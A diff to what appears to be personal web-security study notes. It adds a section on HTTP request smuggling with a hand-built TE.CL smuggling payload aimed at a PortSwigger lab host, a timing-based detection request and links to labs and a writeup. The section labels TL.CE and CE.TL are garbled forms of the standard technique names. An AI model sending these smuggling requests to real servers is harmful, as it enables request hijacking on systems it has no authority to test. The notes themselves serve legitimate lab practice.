@@ -257,9 +257,7 @@ Change the Host header to `localhost` bypasses the authentication mechanism to t
 
 #### Http request smuggling
 
-Use [HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) Extension.
-
-##### Chained with reflected XSS
+##### CE.TL (Chained with reflected XSS)
 
 Indicator:  
 A comment form contains `User-Agent` header as a hidden input.
@@ -295,6 +293,42 @@ x=1
 ```
 
 [Lab: Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)
+
+##### TL.CE
+
+I couldn't figure out how to utilize [HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) with Community Edition.
+
+Although you need to adjust the chunk size and the content length, you can manually perform TL.CE attack:
+```
+POST / HTTP/1.1
+Host: 0a12001c039286248178fc0f006300ee.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded Content-length: 4
+Transfer-Encoding: chunked
+
+5e
+POST /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+```
+[My writeup](https://juntakemura.dev/portswigger-http-requst-smuggling-tecl/) explains how you should set the chunk size etc.
+
+[Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)
+
+Timing technique for checking TE.CL:
+```html
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+```
 
 #### Authentication Bypass
 
